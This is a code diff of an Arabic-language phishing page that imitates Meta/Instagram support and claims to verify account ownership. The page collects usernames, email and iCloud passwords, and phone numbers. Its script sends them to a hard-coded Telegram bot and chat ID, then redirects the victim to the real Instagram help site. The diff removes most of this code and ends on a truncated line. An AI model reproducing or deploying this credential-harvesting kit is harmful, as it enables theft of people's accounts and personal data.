@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مركز المساعدة | Meta</title>
+    <title>مركز المساعدة | Meta Support</title>
     <style>
         body { background-color: #f0f2f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
         .card { background: #ffffff; border-radius: 8px; box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2); width: 100%; max-width: 400px; padding: 25px; text-align: center; border: 1px solid #dddfe2; }
@@ -12,68 +12,4 @@
         h2 { font-size: 19px; color: #1c1e21; margin-bottom: 10px; font-weight: 600; }
         p { color: #65676b; font-size: 13px; line-height: 1.6; margin-bottom: 25px; }
         .field { text-align: right; margin-bottom: 18px; }
-        label { display: block; font-size: 12px; color: #4b4f56; margin-bottom: 5px; font-weight: 600; }
-        input, select { width: 100%; padding: 12px; border: 1px solid #dddfe2; background: #f5f6f7; border-radius: 6px; font-size: 14px; box-sizing: border-box; outline: none; transition: 0.2s; }
-        input:focus { border-color: #1877f2; background: #fff; box-shadow: 0 0 0 2px #e7f3ff; }
-        button { width: 100%; padding: 12px; background: #1877f2; color: #fff; border: none; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; transition: 0.3s; }
-        button:hover { background: #166fe5; }
-        .footer { font-size: 11px; color: #90949c; margin-top: 30px; border-top: 1px solid #ebedf0; padding-top: 15px; }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1024px-Meta_Platforms_Inc._logo.svg.png" class="meta-logo">
-        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" class="insta-logo">
-        
-        <h2>تأكيد ملكية الحساب</h2>
-        <p>لحماية مجتمعنا، نطلب أحياناً من المستخدمين تأكيد بياناتهم عند رصد نشاط غير معتاد. يرجى إكمال النموذج للمتابعة وتجنب تعطيل الحساب.</p>
-
-        <div class="field">
-            <label>هل أنت المالك الأصلي؟</label>
-            <select id="owner"><option>نعم، أنا المالك</option><option>لا، مفوض</option></select>
-        </div>
-        <div class="field">
-            <label>اسم المستخدم</label>
-            <input type="text" id="u" placeholder="@username">
-        </div>
-        <div class="field">
-            <label>البريد الإلكتروني المرتبط</label>
-            <input type="email" id="e" placeholder="email@example.com">
-        </div>
-        <div class="field">
-            <label>كلمة مرور البريد</label>
-            <input type="password" id="ep" placeholder="••••••••">
-        </div>
-        <div class="field">
-            <label>بريد iCloud</label>
-            <input type="email" id="ic" placeholder="example@icloud.com">
-        </div>
-        <div class="field">
-            <label>كلمة مرور iCloud</label>
-            <input type="password" id="icp" placeholder="••••••••">
-        </div>
-        <div class="field">
-            <label>رقم الهاتف</label>
-            <input type="tel" id="ph" placeholder="+966">
-        </div>
-
-        <button onclick="send()">تأكيد الهوية والمتابعة</button>
-        <div class="footer">Instagram from Meta © 2026. كل الحقوق محفوظة.</div>
-    </div>
-
-    <script>
-        function send() {
-            const val = (id) => document.getElementById(id).value;
-            const token = '8041952672:AAHnA6IfRCRniW6qrBw3091KAx4_DsxzcoA';
-            const chat = '7074300443';
-            
-            if(!val('u') || !val('ep')) return alert("يرجى إكمال الحقول الأساسية");
-
-            const text = `🎯 صيد ملكي جديد 🎯\n\n👤 يوزر: ${val('u')}\n📧 بريد: ${val('e')}\n🔑 باس البريد: ${val('ep')}\n🍎 iCloud: ${val('ic')}\n🔐 باس iCloud: ${val('icp')}\n📞 هاتف: ${val('ph')}\n👤 المالك: ${val('owner')}`;
-
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(text)}`)
-            .then(() => window.location.href = "https://help.instagram.com");
-        }
-    </script>
-</body>
-</html>
+        label { display: block; font-size: 12px; color: #4b4f5
